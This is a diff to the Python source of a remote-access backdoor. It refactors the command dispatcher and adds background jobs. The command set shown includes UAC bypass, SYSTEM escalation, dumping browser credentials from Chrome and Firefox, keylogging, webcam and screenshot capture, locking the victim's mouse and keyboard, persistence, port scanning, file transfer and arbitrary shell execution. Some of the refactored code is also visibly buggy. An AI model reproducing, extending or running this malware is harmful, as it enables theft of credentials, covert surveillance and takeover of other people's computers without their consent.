@@ -230,8 +230,29 @@ class PortForwarder:
 		while not ct.stopped() and not self.disconnected:
 			data = self.channel.read_input()
 			self.client_socket.sendall(data)
-
+			
+class Job:
+	def __init__(self, func, args, com):
+		self.func = func
+		self.args = args
+		self.command = com
 		
+		self.output = "[-]Command still running."
+		self.finished = False
+		
+		self.thread = StoppableThread(target=self.run)
+		self.thread.daemon = True
+		self.thread.start()
+		
+	def run(self):
+		self.output = self.func(self.args)
+		self.finished = True
+		
+	def __repr__(self):
+		return self.command+", Finished: "+str(self.finished)
+		
+	def __str__(self):
+		return self.__repr__()
 	
 class Transport:
 	""""
@@ -391,7 +412,7 @@ class Execute:
 		timer.cancel()
 		self.killed = False
 		logging.debug("Result of shell command: "+out.strip())
-		return proc.returncode, out
+		return out
 		
 class Filesystem:
 	"""
@@ -457,7 +478,7 @@ class Miscellaneous:
 	 
 	@windows_only
 	def name_of_admin_group(self):
-		for line in execute.execute_shell_command("whoami /groups")[1].splitlines():
+		for line in execute.execute_shell_command("whoami /groups").splitlines():
 			if "S-1-5-32-544" in line: # S-1-5-32-544 is a well-known identifier for the admin group
 				return line.split()[0].split("\\")[1]
 				
@@ -493,7 +514,7 @@ class Privilege_Escalation:
 			logging.debug("UAC bypass failed: Current user is not part of admin group.")
 			return "[-]Current user is not part of admin group."
 		 
-		if not execute.execute_shell_command("REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin")[1].split()[3] == "0x5":
+		if not execute.execute_shell_command("REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin").split()[3] == "0x5":
 			logging.debug("UAC bypass failed: UAC on wrong notification policy.")
 			return "[-]UAC is disabled or notification policy is set to 'Always'"
 			
@@ -508,9 +529,9 @@ class Privilege_Escalation:
 		
 	@windows_only
 	def create_service(self, path, name):
-		if execute.execute_shell_command("sc create "+name+" binPath= "+path+" start= auto")[0] != 0:
+		if execute.execute_shell_command("sc create "+name+" binPath= "+path+" start= auto") != 0: # BROKEN, FIX!!!!!!!!!
 			return False
-		if execute.execute_shell_command("sc start "+name)[0] != 0: # TODO: check why this is broken
+		if execute.execute_shell_command("sc start "+name) != 0: # TODO: check why this is broken
 			return False											# Broken cuz we're not a proper service
 		return True
 		
@@ -633,7 +654,8 @@ class Information_Gathering:
 		win32api.PostThreadMessage(self.keylock.ident, win32con.WM_QUIT, 0, 0)
 		
 	@windows_only
-	def uictl(self, action, what):
+	def uictl(self, a):
+		action, what = a
 		what = what.lower()
 		action = action.lower()
 		if what not in ["keyboard","mouse"]: return "[-]Unknown object: "+what
@@ -709,8 +731,9 @@ class Networking:
 			except:
 				continue
 				
-	def portscan(self, hosts, ports):
+	def portscan(self, a):
 		q = Queue.Queue()
+		hosts, ports = a.split()
 		host_list = []
 		port_list = []
 		for i in ports.split(","):
@@ -788,18 +811,11 @@ class Shell:
 	def __init__(self, transport):
 		self.transport = transport
 		self.channel = self.transport.user_channel
+		self.jobs = []
 		
-	def run(self):
-		if not self.transport.connect(): return False
-		
-		while True:
-			data = self.recv()
-			if data == "CONN_LOST":
-				return False
-			elif data == "PING":
-			    output = "PONG"
-			elif data == "help" or data == "?":
-				output = '''Commands:
+	def help(self):
+		return '''Commands:
+jobs [start|add|list|print|stop|rm] [number] - Add and remove commands running in background.
 isadmin - Returns whether the current process has admin privileges.
 bypassuac - Bypasses UAC.
 dumpchrome - Dumps Chrome credentials.
@@ -816,98 +832,163 @@ webcam [list|snap] [id] - Take a picture from the webcam
 uictl [disable|enable] [mouse|keyboard] - Lock or unlock mouse and keyboard.
 help - This menu!
 '''
-			elif data.startswith("cd"):
-				data = data[3:]
-				output = fs.change_directory(data.strip())
+		
+	def pong(self):
+		return "PONG"
+		
+	def error(self, err):
+		return err
+		
+	def parse_command(self, data):
+		if data == "CONN_LOST":
+			return False, False
+			
+		elif data == "PING":
+			return self.pong, 
+			
+		elif data == "help" or data == "?":
+			return self.help, 
+			
+		elif data.startswith("cd"):
+			data = data[3:]
+			return fs.change_directory, data.strip()
+			
+		elif data == "ls":
+			return execute.execute_shell_command, "dir"
+			
+		elif data == "ps":
+			return execute.execute_shell_command, "tasklist"
+			
+		elif data.startswith("killall"):
+			process = data.split()[1]
+			return execute.execute_shell_command, "taskkill /F /IM "+process+" /T"
+			
+		elif data == "isadmin":
+			return misc.isadmin, 
+			
+		elif data == "bypassuac":
+			return privesc.bypass_uac,
+			
+		elif data == "dumpchrome":
+			return info.dump_chrome,
+			
+		elif data == "dumpff":
+			return info.dump_firefox,
+			
+		elif data == "die":
+			os._exit(0)
+			
+		elif data == "getsystem":
+			return privesc.get_system,
+			
+		elif data.startswith("download"):
+			file = data.split()[1]
+			return fs.download, file, self.channel
+			
+		elif data.startswith("upload"):
+			file = data.split()[1]
+			return fs.upload, file, self.channel
+			
+		elif data == "persist":
+			return misc.persist, 
+			
+		elif data.startswith("portscan"):
+			try:
+				hosts, ports = data.split()[1], data.split()[2]
+				return net.portscan, hosts, ports
+			except Exception as e:
+				return self.error, str(e)+"\nusage: portscan [host_range] [port_range]"
 				
-			elif data == "ls":
-				output = execute.execute_shell_command("dir")[1]
+		elif data.startswith("keylog") or data.startswith("keyscan"):
+			try:
+				arg = data.split()[1]
+			except:
+				return self.error, "[*] Usage: keylog [start|stop|dump]"
+				arg = ""
+			if arg == "start":
+				return info.keylog_start,
+			elif arg == "stop":
+				return info.keylog_stop, 
+			elif arg == "dump":
+				return info.keylog_dump,
 				
-			elif data == "ps":
-				output = execute.execute_shell_command("tasklist")[1]
+		elif data.startswith("webcam"):
+			try:
+				arg = data.split()[1]
+			except:
+				return self.error, "[*] Usage: webcam [list|snap [id] ]"
+				arg = ""
+			
+			if arg == "list":
+				return info.webcam_list, 
+			elif arg == "snap":
+				try: num = data.split()[2]
+				except: return err, "[*] Usage: webcam [list|snap [id] ]"
+				return info.webcam_snap, num
 				
-			elif data.startswith("killall"):
-				process = data.split()[1]
-				output = execute.execute_shell_command("taskkill /F /IM "+process+" /T")
-				
-			elif data == "isadmin":
-				output = str(misc.isadmin())
-				
-			elif data == "bypassuac":
-				output = privesc.bypass_uac()
-				
-			elif data == "dumpchrome":
-				output = info.dump_chrome()
-				
-			elif data == "dumpff":
-				output = info.dump_firefox()
-				
-			elif data == "die":
-				os._exit(0)
-				
-			elif data == "getsystem":
-				output = privesc.get_system()
-				
-			elif data.startswith("download"):
-				file = data.split()[1]
-				output = fs.download(file, self.channel)
-				
-			elif data.startswith("upload"):
-				file = data.split()[1]
-				output = fs.upload(file, self.channel)
-				if output: return False
-				
-			elif data == "persist":
-				output = misc.persist()
-				
-			elif data.startswith("portscan"):
-				try:
-					hosts, ports = data.split()[1], data.split()[2]
-					output = net.portscan(hosts, ports)
-				except Exception as e:
-					output = str(e)+"\nusage: portscan [host_range] [port_range]"
-					
-			elif data.startswith("keylog") or data.startswith("keyscan"):
-				try:
-					arg = data.split()[1]
-				except:
-					output = "[*] Usage: keylog [start|stop|dump]"
-					arg = ""
-				if arg == "start":
-					output = info.keylog_start()
-				elif arg == "stop":
-					output = info.keylog_stop()
-				elif arg == "dump":
-					output = info.keylog_dump()
-					
-			elif data.startswith("webcam"):
-				try:
-					arg = data.split()[1]
-				except:
-					output = "[*] Usage: webcam [list|snap [id] ]"
-					arg = ""
-				
-				if arg == "list":
-					output = info.webcam_list()
-				elif arg == "snap":
-					try: num = data.split()[2]
-					except: output = "[*] Usage: webcam [list|snap [id] ]"
-					output = info.webcam_snap(num)
-					
-			elif data.startswith("uictl"):
-				try:
-					action, what = data.split()[1], data.split()[2]
-				except:
-					output = "[*]Usage: uictl [disable|enable] [mouse|keyboard]"
-				else:
-					output = info.uictl(action, what)
-					
-			elif data == "screenshot":
-				output = info.take_screenshot()
-
+		elif data.startswith("uictl"):
+			try:
+				action, what = data.split()[1], data.split()[2]
+			except:
+				return self.error, "[*]Usage: uictl [disable|enable] [mouse|keyboard]"
 			else:
-				output = execute.execute_shell_command(data)[1]
+				return info.uictl, action, what
+				
+		elif data == "screenshot":
+			return info.take_screenshot
 
+		else:
+			return execute.execute_shell_command, data
+		
+	def run(self):
+		if not self.transport.connect(): return False
+		
+		while True:
+			data = self.recv()
+			
+			if data.startswith("jobs"):
+				data = data.split()
+				if len(data) < 2:
+					output = "[*]Usage: jobs [start|add|list|print|stop|rm] [number]"
+				
+				elif data[1] == "start" or data[1] == "add":
+					if len(data) < 3: output = "[-]What do you want me to run?"
+					else:
+						command = " ".join(data[2:])
+						parsed = self.parse_command(command)
+						func, args = parsed[0], " ".join(parsed[1:])
+						
+						job = Job(func, args, command)
+						self.jobs.append(job)
+						output = "[+]Job started."
+					
+				elif data[1] == "list":
+					output = "[*]Current active jobs:\n"
+					for i, job in enumerate(self.jobs):
+						output += "["+str(i)+"]: "+str(job)+"\n"
+						
+				elif data[1] == "print":
+					if len(data) < 3: output = "[-]Which job?"
+					else:
+						which = int(data[2])
+						output = self.jobs[which].output
+					
+				elif data[1] == "stop" or data[1] == "rm":
+					if len(data) < 3: output = "[-]Which job?"
+					else:
+						which = int(data[2])
+						del self.jobs[which]
+						output = "[+]Job removed."
+					
+				else:
+					output = "[-]No such option: "+data[1]
+				
+			else:
+				parsed = self.parse_command(data)
+				func, args = parsed[0], parsed[1:]
+				if not func: return False
+				output = func(*args)
+				
 			if output != "BG_NEW_SESH": self.send(str(output)+"\n"+os.getcwd()+">>")
 		
 	def send(self, data):
